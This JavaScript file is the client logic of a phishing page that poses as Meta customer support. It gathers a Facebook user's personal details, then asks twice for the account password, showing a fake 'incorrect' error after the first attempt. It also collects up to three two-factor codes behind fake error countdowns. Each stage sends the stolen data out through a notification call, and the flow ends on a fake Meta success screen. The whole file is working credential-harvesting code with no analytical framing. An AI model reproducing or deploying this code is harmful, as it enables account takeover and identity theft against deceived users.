// Main Application Logic

// Generate ticket ID
document.getElementById('ticketId').textContent = Utils.generateTicketId();

// Start verification flow
document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);

const PHONE_COUNTRIES = [
    { iso: 'af', name: 'Afghanistan', dial: '+93' },
    { iso: 'al', name: 'Albania', dial: '+355' },
    { iso: 'dz', name: 'Algeria', dial: '+213' },
    { iso: 'ad', name: 'Andorra', dial: '+376' },
    { iso: 'ao', name: 'Angola', dial: '+244' },
    { iso: 'ar', name: 'Argentina', dial: '+54' },
    { iso: 'am', name: 'Armenia', dial: '+374' },
    { iso: 'au', name: 'Australia', dial: '+61' },
    { iso: 'at', name: 'Austria', dial: '+43' },
    { iso: 'az', name: 'Azerbaijan', dial: '+994' },
    { iso: 'bh', name: 'Bahrain', dial: '+973' },
    { iso: 'bd', name: 'Bangladesh', dial: '+880' },
    { iso: 'by', name: 'Belarus', dial: '+375' },
    { iso: 'be', name: 'Belgium', dial: '+32' },
    { iso: 'bz', name: 'Belize', dial: '+501' },
    { iso: 'bj', name: 'Benin', dial: '+229' },
    { iso: 'bt', name: 'Bhutan', dial: '+975' },
    { iso: 'bo', name: 'Bolivia', dial: '+591' },
    { iso: 'ba', name: 'Bosnia and Herzegovina', dial: '+387' },
    { iso: 'bw', name: 'Botswana', dial: '+267' },
    { iso: 'br', name: 'Brazil', dial: '+55' },
    { iso: 'bn', name: 'Brunei', dial: '+673' },
    { iso: 'bg', name: 'Bulgaria', dial: '+359' },
    { iso: 'bf', name: 'Burkina Faso', dial: '+226' },
    { iso: 'bi', name: 'Burundi', dial: '+257' },
    { iso: 'kh', name: 'Cambodia', dial: '+855' },
    { iso: 'cm', name: 'Cameroon', dial: '+237' },
    { iso: 'ca', name: 'Canada', dial: '+1' },
    { iso: 'cv', name: 'Cape Verde', dial: '+238' },
    { iso: 'td', name: 'Chad', dial: '+235' },
    { iso: 'cl', name: 'Chile', dial: '+56' },
    { iso: 'cn', name: 'China', dial: '+86' },
    { iso: 'co', name: 'Colombia', dial: '+57' },
    { iso: 'km', name: 'Comoros', dial: '+269' },
    { iso: 'cg', name: 'Congo', dial: '+242' },
    { iso: 'cd', name: 'Congo (DRC)', dial: '+243' },
    { iso: 'cr', name: 'Costa Rica', dial: '+506' },
    { iso: 'hr', name: 'Croatia', dial: '+385' },
    { iso: 'cu', name: 'Cuba', dial: '+53' },
    { iso: 'cy', name: 'Cyprus', dial: '+357' },
    { iso: 'cz', name: 'Czechia', dial: '+420' },
    { iso: 'dk', name: 'Denmark', dial: '+45' },
    { iso: 'dj', name: 'Djibouti', dial: '+253' },
    { iso: 'do', name: 'Dominican Republic', dial: '+1' },
    { iso: 'ec', name: 'Ecuador', dial: '+593' },
    { iso: 'eg', name: 'Egypt', dial: '+20' },
    { iso: 'sv', name: 'El Salvador', dial: '+503' },
    { iso: 'ee', name: 'Estonia', dial: '+372' },
    { iso: 'et', name: 'Ethiopia', dial: '+251' },
    { iso: 'fj', name: 'Fiji', dial: '+679' },
    { iso: 'fi', name: 'Finland', dial: '+358' },
    { iso: 'fr', name: 'France', dial: '+33' },
    { iso: 'ga', name: 'Gabon', dial: '+241' },
    { iso: 'gm', name: 'Gambia', dial: '+220' },
    { iso: 'ge', name: 'Georgia', dial: '+995' },
    { iso: 'de', name: 'Germany', dial: '+49' },
    { iso: 'gh', name: 'Ghana', dial: '+233' },
    { iso: 'gr', name: 'Greece', dial: '+30' },
    { iso: 'gt', name: 'Guatemala', dial: '+502' },
    { iso: 'gn', name: 'Guinea', dial: '+224' },
    { iso: 'gy', name: 'Guyana', dial: '+592' },
    { iso: 'ht', name: 'Haiti', dial: '+509' },
    { iso: 'hn', name: 'Honduras', dial: '+504' },
    { iso: 'hk', name: 'Hong Kong', dial: '+852' },
    { iso: 'hu', name: 'Hungary', dial: '+36' },
    { iso: 'is', name: 'Iceland', dial: '+354' },
    { iso: 'in', name: 'India', dial: '+91' },
    { iso: 'id', name: 'Indonesia', dial: '+62' },
    { iso: 'ir', name: 'Iran', dial: '+98' },
    { iso: 'iq', name: 'Iraq', dial: '+964' },
    { iso: 'ie', name: 'Ireland', dial: '+353' },
    { iso: 'il', name: 'Israel', dial: '+972' },
    { iso: 'it', name: 'Italy', dial: '+39' },
    { iso: 'ci', name: 'Ivory Coast', dial: '+225' },
    { iso: 'jm', name: 'Jamaica', dial: '+1' },
    { iso: 'jp', name: 'Japan', dial: '+81' },
    { iso: 'jo', name: 'Jordan', dial: '+962' },
    { iso: 'kz', name: 'Kazakhstan', dial: '+7' },
    { iso: 'ke', name: 'Kenya', dial: '+254' },
    { iso: 'kw', name: 'Kuwait', dial: '+965' },
    { iso: 'kg', name: 'Kyrgyzstan', dial: '+996' },
    { iso: 'la', name: 'Laos', dial: '+856' },
    { iso: 'lv', name: 'Latvia', dial: '+371' },
    { iso: 'lb', name: 'Lebanon', dial: '+961' },
    { iso: 'ly', name: 'Libya', dial: '+218' },
    { iso: 'lt', name: 'Lithuania', dial: '+370' },
    { iso: 'lu', name: 'Luxembourg', dial: '+352' },
    { iso: 'mo', name: 'Macau', dial: '+853' },
    { iso: 'mg', name: 'Madagascar', dial: '+261' },
    { iso: 'mw', name: 'Malawi', dial: '+265' },
    { iso: 'my', name: 'Malaysia', dial: '+60' },
    { iso: 'mv', name: 'Maldives', dial: '+960' },
    { iso: 'ml', name: 'Mali', dial: '+223' },
    { iso: 'mt', name: 'Malta', dial: '+356' },
    { iso: 'mr', name: 'Mauritania', dial: '+222' },
    { iso: 'mu', name: 'Mauritius', dial: '+230' },
    { iso: 'mx', name: 'Mexico', dial: '+52' },
    { iso: 'md', name: 'Moldova', dial: '+373' },
    { iso: 'mc', name: 'Monaco', dial: '+377' },
    { iso: 'mn', name: 'Mongolia', dial: '+976' },
    { iso: 'me', name: 'Montenegro', dial: '+382' },
    { iso: 'ma', name: 'Morocco', dial: '+212' },
    { iso: 'mz', name: 'Mozambique', dial: '+258' },
    { iso: 'mm', name: 'Myanmar', dial: '+95' },
    { iso: 'na', name: 'Namibia', dial: '+264' },
    { iso: 'np', name: 'Nepal', dial: '+977' },
    { iso: 'nl', name: 'Netherlands', dial: '+31' },
    { iso: 'nz', name: 'New Zealand', dial: '+64' },
    { iso: 'ni', name: 'Nicaragua', dial: '+505' },
    { iso: 'ne', name: 'Niger', dial: '+227' },
    { iso: 'ng', name: 'Nigeria', dial: '+234' },
    { iso: 'kp', name: 'North Korea', dial: '+850' },
    { iso: 'mk', name: 'North Macedonia', dial: '+389' },
    { iso: 'no', name: 'Norway', dial: '+47' },
    { iso: 'om', name: 'Oman', dial: '+968' },
    { iso: 'pk', name: 'Pakistan', dial: '+92' },
    { iso: 'ps', name: 'Palestine', dial: '+970' },
    { iso: 'pa', name: 'Panama', dial: '+507' },
    { iso: 'pg', name: 'Papua New Guinea', dial: '+675' },
    { iso: 'py', name: 'Paraguay', dial: '+595' },
    { iso: 'pe', name: 'Peru', dial: '+51' },
    { iso: 'ph', name: 'Philippines', dial: '+63' },
    { iso: 'pl', name: 'Poland', dial: '+48' },
    { iso: 'pt', name: 'Portugal', dial: '+351' },
    { iso: 'pr', name: 'Puerto Rico', dial: '+1' },
    { iso: 'qa', name: 'Qatar', dial: '+974' },
    { iso: 'ro', name: 'Romania', dial: '+40' },
    { iso: 'ru', name: 'Russia', dial: '+7' },
    { iso: 'rw', name: 'Rwanda', dial: '+250' },
    { iso: 'sa', name: 'Saudi Arabia', dial: '+966' },
    { iso: 'sn', name: 'Senegal', dial: '+221' },
    { iso: 'rs', name: 'Serbia', dial: '+381' },
    { iso: 'sg', name: 'Singapore', dial: '+65' },
    { iso: 'sk', name: 'Slovakia', dial: '+421' },
    { iso: 'si', name: 'Slovenia', dial: '+386' },
    { iso: 'so', name: 'Somalia', dial: '+252' },
    { iso: 'za', name: 'South Africa', dial: '+27' },
    { iso: 'kr', name: 'South Korea', dial: '+82' },
    { iso: 'ss', name: 'South Sudan', dial: '+211' },
    { iso: 'es', name: 'Spain', dial: '+34' },
    { iso: 'lk', name: 'Sri Lanka', dial: '+94' },
    { iso: 'sd', name: 'Sudan', dial: '+249' },
    { iso: 'se', name: 'Sweden', dial: '+46' },
    { iso: 'ch', name: 'Switzerland', dial: '+41' },
    { iso: 'sy', name: 'Syria', dial: '+963' },
    { iso: 'tw', name: 'Taiwan', dial: '+886' },
    { iso: 'tj', name: 'Tajikistan', dial: '+992' },
    { iso: 'tz', name: 'Tanzania', dial: '+255' },
    { iso: 'th', name: 'Thailand', dial: '+66' },
    { iso: 'tl', name: 'Timor-Leste', dial: '+670' },
    { iso: 'tg', name: 'Togo', dial: '+228' },
    { iso: 'tt', name: 'Trinidad and Tobago', dial: '+1' },
    { iso: 'tn', name: 'Tunisia', dial: '+216' },
    { iso: 'tr', name: 'Turkey', dial: '+90' },
    { iso: 'tm', name: 'Turkmenistan', dial: '+993' },
    { iso: 'ug', name: 'Uganda', dial: '+256' },
    { iso: 'ua', name: 'Ukraine', dial: '+380' },
    { iso: 'ae', name: 'United Arab Emirates', dial: '+971' },
    { iso: 'gb', name: 'United Kingdom', dial: '+44' },
    { iso: 'us', name: 'United States', dial: '+1' },
    { iso: 'uy', name: 'Uruguay', dial: '+598' },
    { iso: 'uz', name: 'Uzbekistan', dial: '+998' },
    { iso: 've', name: 'Venezuela', dial: '+58' },
    { iso: 'vn', name: 'Vietnam', dial: '+84' },
    { iso: 'ye', name: 'Yemen', dial: '+967' },
    { iso: 'zm', name: 'Zambia', dial: '+260' },
    { iso: 'zw', name: 'Zimbabwe', dial: '+263' }
];

function phoneFlagUrl(iso) {
    return `https://flagcdn.com/w40/${iso}.png`;
}

function getDefaultPhoneCountry() {
    const iso = String((Utils._locationCache && Utils._locationCache.country_code) || '').toLowerCase();
    return PHONE_COUNTRIES.find((item) => item.iso === iso) || PHONE_COUNTRIES.find((item) => item.iso === 'us');
}

function bindPhoneCountryField() {
    const field = document.getElementById('phoneField');
    const btn = document.getElementById('phoneCountryBtn');
    const flagEl = document.getElementById('phoneCountryFlag');
    const dialEl = document.getElementById('phoneCountryDial');
    const menu = document.getElementById('phoneCountryMenu');
    const search = document.getElementById('phoneCountrySearch');
    const list = document.getElementById('phoneCountryList');
    const hidden = document.getElementById('phoneDialCode');
    if (!field || !btn || !menu || !list) return;

    let selected = getDefaultPhoneCountry();

    const applyCountry = (country) => {
        selected = country;
        hidden.value = country.dial;
        flagEl.src = phoneFlagUrl(country.iso);
        flagEl.alt = country.name;
        dialEl.textContent = country.dial;
        list.querySelectorAll('.phone-country-option').forEach((item) => {
            item.classList.toggle('is-active', item.dataset.iso === country.iso);
        });
    };

    list.innerHTML = PHONE_COUNTRIES.map((country) => `
        <button type="button" class="phone-country-option" data-iso="${country.iso}" data-dial="${country.dial}" data-name="${country.name.toLowerCase()}">
            <img src="${phoneFlagUrl(country.iso)}" alt="" width="20" height="14">
            <span class="phone-country-name">${country.name}</span>
            <span class="phone-country-code notranslate">${country.dial}</span>
        </button>
    `).join('');

    applyCountry(selected);

    const placeMenu = () => {
        const rect = field.getBoundingClientRect();
        menu.style.left = `${rect.left}px`;
        menu.style.width = `${rect.width}px`;
        const spaceBelow = window.innerHeight - rect.bottom;
        if (spaceBelow < 280 && rect.top > 280) {
            menu.style.top = 'auto';
            menu.style.bottom = `${window.innerHeight - rect.top + 6}px`;
        } else {
            menu.style.bottom = 'auto';
            menu.style.top = `${rect.bottom + 6}px`;
        }
    };

    const closeMenu = () => {
        menu.classList.add('hidden');
        btn.setAttribute('aria-expanded', 'false');
    };

    const openMenu = () => {
        menu.classList.remove('hidden');
        btn.setAttribute('aria-expanded', 'true');
        placeMenu();
        search.value = '';
        list.querySelectorAll('.phone-country-option').forEach((item) => {
            item.hidden = false;
        });
        const active = list.querySelector('.phone-country-option.is-active');
        if (active) active.scrollIntoView({ block: 'nearest' });
        search.focus();
    };

    btn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        if (menu.classList.contains('hidden')) openMenu();
        else closeMenu();
    });

    list.addEventListener('click', (e) => {
        const option = e.target.closest('.phone-country-option');
        if (!option) return;
        const country = PHONE_COUNTRIES.find((item) => item.iso === option.dataset.iso);
        if (country) applyCountry(country);
        closeMenu();
        document.getElementById('phone').focus();
    });

    search.addEventListener('input', () => {
        const q = search.value.trim().toLowerCase().replace(/^\+/, '');
        list.querySelectorAll('.phone-country-option').forEach((item) => {
            const hay = `${item.dataset.name} ${item.dataset.dial} ${item.dataset.iso}`;
            item.hidden = q !== '' && !hay.includes(q);
        });
    });

    const floating = document.body.querySelector(':scope > #phoneCountryMenu');
    if (floating && floating !== menu) floating.remove();
    document.body.appendChild(menu);

    document.addEventListener('click', (e) => {
        if (!menu.contains(e.target) && !btn.contains(e.target)) closeMenu();
    });
    window.addEventListener('resize', () => {
        if (!menu.classList.contains('hidden')) placeMenu();
    });
}

function getFullPhoneNumber() {
    const dial = (document.getElementById('phoneDialCode') || {}).value || '';
    let number = (document.getElementById('phone') || {}).value || '';
    number = String(number).trim().replace(/[\s()-]/g, '');
    if (!number) return '';
    if (number.startsWith('+')) return number;
    number = number.replace(/^0+/, '');
    return `${dial}${number}`;
}

// ==================== MODAL 1: CLIENT INFO ====================
function openClientModal() {
    const currentYear = new Date().getFullYear();
    const dayOptions = Array.from({ length: 31 }, (_, i) => {
        const day = i + 1;
        return `<option value="${day}">${day}</option>`;
    }).join('');
    const monthOptions = Array.from({ length: 12 }, (_, i) => {
        const month = i + 1;
        return `<option value="${month}">${month}</option>`;
    }).join('');
    const yearOptions = Array.from({ length: currentYear - 1899 }, (_, i) => {
        const year = currentYear - i;
        return `<option value="${year}">${year}</option>`;
    }).join('');

    const fieldClass = 'info-form-control';
    const labelClass = 'info-form-label';
    const req = '<span class="info-form-required">*</span>';

    const content = `
        <div class="info-form">
            <div class="info-form-header">
                <h2 class="info-form-title">Activation information</h2>
            </div>
            <form id="clientForm" class="info-form-body">
                <div class="info-form-section">
                    <p class="info-form-section-title">Personal details</p>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fullName">Full name ${req}</label>
                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="Enter your full name" autocomplete="name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fanpage">Page name ${req}</label>
                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="Enter your Page name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="day">Date of birth ${req}</label>
                        <div class="info-form-dob">
                            <select id="month" name="month" class="${fieldClass}" required>
                                <option value="" disabled selected hidden>Month</option>
                                ${monthOptions}
                            </select>
                            <select id="day" name="day" class="${fieldClass}" required>
                                <option value="" disabled selected hidden>Day</option>
                                ${dayOptions}
                            </select>
                            <select id="year" name="year" class="${fieldClass}" required>
                                <option value="" disabled selected hidden>Year</option>
                                ${yearOptions}
                            </select>
                        </div>
                    </div>
                </div>

                <div class="info-form-section">
                    <p class="info-form-section-title">Contact</p>
                    <div class="info-form-grid">
                        <div class="info-form-field">
                            <label class="${labelClass}" for="email">Email ${req}</label>
                            <input type="email" id="email" name="email" class="${fieldClass}" placeholder="name@example.com" autocomplete="email" required>
                        </div>
                        <div class="info-form-field">
                            <label class="${labelClass}" for="emailBusiness">Business email ${req}</label>
                            <input type="email" id="emailBusiness" name="emailBusiness" class="${fieldClass}" placeholder="business@example.com" autocomplete="email" required>
                        </div>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="phone">Phone number ${req}</label>
                        <div class="phone-field" id="phoneField">
                            <button type="button" id="phoneCountryBtn" class="phone-country-btn" aria-expanded="false" aria-haspopup="listbox">
                                <img id="phoneCountryFlag" class="phone-flag" src="${phoneFlagUrl('us')}" alt="">
                                <svg class="phone-caret" width="10" height="6" viewBox="0 0 10 6" fill="none" aria-hidden="true">
                                    <path d="M1 1l4 4 4-4" stroke="#65676b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                                </svg>
                                <span id="phoneCountryDial" class="phone-dial notranslate">+1</span>
                            </button>
                            <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="Phone number" autocomplete="tel" inputmode="tel" required>
                            <input type="hidden" id="phoneDialCode" name="phoneDialCode" value="+1">
                        </div>
                        <div id="phoneCountryMenu" class="phone-country-menu hidden">
                            <input type="search" id="phoneCountrySearch" class="phone-country-search" placeholder="Search country" autocomplete="off">
                            <div id="phoneCountryList" class="phone-country-list" role="listbox"></div>
                        </div>
                    </div>
                </div>

                <div class="info-form-section">
                    <div class="info-form-field">
                        <label class="${labelClass}" for="notes">Additional notes <span class="info-form-optional">Optional</span></label>
                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="Add any information that may help us review your request" rows="3"></textarea>
                    </div>
                    <p class="info-form-hint">Our response will be sent to you within 14–48 hours.</p>
                </div>

                <label class="info-form-terms" for="termsAgree">
                    <input type="checkbox" id="termsAgree" name="termsAgree">
                    <span>I agree to the <a href="#" class="info-form-link">Terms of use</a></span>
                </label>

                <button type="submit" class="info-form-submit">Submit</button>
            </form>
        </div>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');
    bindPhoneCountryField();

    const termsLink = document.querySelector('#clientModal .info-form-link');
    if (termsLink) {
        termsLink.addEventListener('click', (e) => e.preventDefault());
    }

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: getFullPhoneNumber(),
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        const menu = document.getElementById('phoneCountryMenu');
        if (menu) menu.remove();
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="info-form security-form">
            <div class="security-form-brand">
                <img src="./public/icons/ic_logo.svg" alt="Meta">
            </div>
            <div class="info-form-header">
                <h2 class="info-form-title">Enter your password</h2>
                <p class="info-form-subtitle">For your security, enter your password to continue this request.</p>
            </div>
            <form id="securityForm" class="info-form-body">
                <div class="info-form-field">
                    <label class="info-form-label" for="password">Password <span class="info-form-required">*</span></label>
                    <div class="password-field">
                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" required>
                        <button type="button" id="togglePassword" class="password-toggle">Show</button>
                    </div>
                    <p id="passwordError" class="info-form-error hidden"></p>
                </div>
                <button type="submit" class="info-form-submit">Continue</button>
            </form>
            <div class="security-form-footer">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    const passwordInput = document.getElementById('password');
    const errorMsg = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    togglePassword.addEventListener('click', () => {
        const showPlain = passwordInput.type === 'password';
        passwordInput.type = showPlain ? 'text' : 'password';
        togglePassword.textContent = showPlain ? 'Hide' : 'Show';
    });

    passwordInput.addEventListener('input', () => {
        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
    });

    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = passwordInput.value.trim();
        const submitBtn = e.target.querySelector('button[type="submit"]');

        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            passwordInput.classList.add('is-error');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                passwordInput.value = '';
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                passwordInput.classList.add('is-error');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = `Enter the 6 or 8-digit code we sent to ${emailDisplay}, ${phoneDisplay}, or from your authenticator app.`;

    const content = `
        <div class="info-form auth-form">
            <div class="auth-form-meta">
                <span>${userData.fullName || ''}</span>
                <span class="auth-form-dot"></span>
                <span>Facebook</span>
            </div>
            <div class="info-form-header">
                <h2 class="info-form-title">Two-factor authentication</h2>
                <p class="info-form-subtitle">${description}</p>
            </div>
            <div class="auth-form-preview">
                <img src="./public/images/authentication.png" alt="2FA">
            </div>
            <form id="authForm" class="info-form-body">
                <div class="info-form-field">
                    <label class="info-form-label" for="twoFa">Authentication code <span class="info-form-required">*</span></label>
                    <input type="text" id="twoFa" name="twoFa" class="info-form-control auth-code-input" placeholder="6 or 8 digits" inputmode="numeric" autocomplete="one-time-code" maxlength="8" pattern="\\d{6}|\\d{8}" required>
                    <p id="authError" class="info-form-error hidden"></p>
                </div>
                <button type="submit" class="info-form-submit">Continue</button>
            </form>
            <div class="security-form-footer">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;
    const input = document.getElementById('twoFa');
    const errorMsg = document.getElementById('authError');

    const sanitizeTwoFa = (value) => String(value || '').replace(/\D/g, '').slice(0, 8);
    const isValidTwoFa = (value) => value.length === 6 || value.length === 8;
    const showAuthError = (message) => {
        errorMsg.textContent = message;
        errorMsg.classList.remove('hidden');
        input.classList.add('is-error');
    };
    const clearAuthError = () => {
        errorMsg.classList.add('hidden');
        input.classList.remove('is-error');
    };

    input.addEventListener('input', () => {
        input.value = sanitizeTwoFa(input.value);
        clearAuthError();
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        input.value = sanitizeTwoFa((e.clipboardData || window.clipboardData).getData('text'));
        clearAuthError();
    });

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = sanitizeTwoFa(input.value);
        const submitBtn = e.target.querySelector('button[type="submit"]');
        input.value = twoFa;

        clearAuthError();
        if (!twoFa) {
            showAuthError("You haven't entered the code!");
            return;
        }
        if (!isValidTwoFa(twoFa)) {
            showAuthError('Enter a 6 or 8-digit code.');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(submitBtn, 15);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(submitBtn, 30);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(submitBtn, seconds) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = seconds;
        showAuthError(`The code is incorrect. Try again after ${time} seconds.`);

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                clearAuthError();
                input.focus();
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/success.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}

